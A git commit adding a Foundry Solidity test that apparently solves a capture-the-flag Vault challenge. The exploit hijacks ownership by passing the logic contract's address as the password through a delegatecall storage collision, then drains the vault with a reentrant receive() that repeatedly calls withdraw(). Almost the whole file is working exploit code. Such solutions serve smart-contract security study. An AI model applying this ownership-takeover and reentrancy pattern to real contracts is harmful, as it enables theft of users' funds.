f55a8b4a668d6edc1e66e6a2b292c8470c0de5d9
gmh5225 <2315157@qq.com>
2024-11-08 12:57:19 +0800

    update

---
+++ test/Vault.t.sol
@@ -0,0 +1,71 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "../src/Vault.sol";
+
+contract VaultExploiter is Test {
+    Vault public vault;
+    VaultLogic public logic;
+
+    address owner = address(1);
+    address palyer = address(this);
+
+    bool start_attack = false;
+
+    function setUp() public {
+        vm.deal(owner, 1 ether);
+
+        vm.startPrank(owner);
+        bytes32 setupPassword = bytes32("0x1234");
+        logic = new VaultLogic(setupPassword);
+        vault = new Vault(address(logic));
+
+        vault.deposite{ value: 0.1 ether }();
+        vm.stopPrank();
+    }
+
+    function testExploit() public {
+        vm.deal(palyer, 1 ether);
+        vm.startPrank(palyer);
+
+        bytes4 selector = bytes4(keccak256("changeOwner(bytes32,address)"));
+
+        bytes32 password = 0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459;
+
+        bytes memory callData = abi.encodePacked(selector, password, uint256(uint160(palyer)));
+
+        console2.log("callData:");
+        console2.logBytes(callData);
+
+        console2.logBytes4(selector);
+        console2.logBytes32(password);
+
+        (bool success,) = address(vault).call(callData);
+
+        assertEq(vault.owner(), palyer);
+
+        vault.openWithdraw();
+
+        // trigger receive to attack
+        start_attack = true;
+        vault.deposite{ value: 0.01 ether }();
+
+        console2.log("vault balance before attack:", address(vault).balance);
+
+        vault.withdraw();
+
+        console2.log("vault balance after attack:", address(vault).balance);
+
+        require(vault.isSolve(), "solved");
+        vm.stopPrank();
+    }
+
+    receive() external payable {
+        if (start_attack) {
+            console2.log("-------attacked ------");
+            // start_attack = false;
+            vault.withdraw();
+        }
+    }
+}
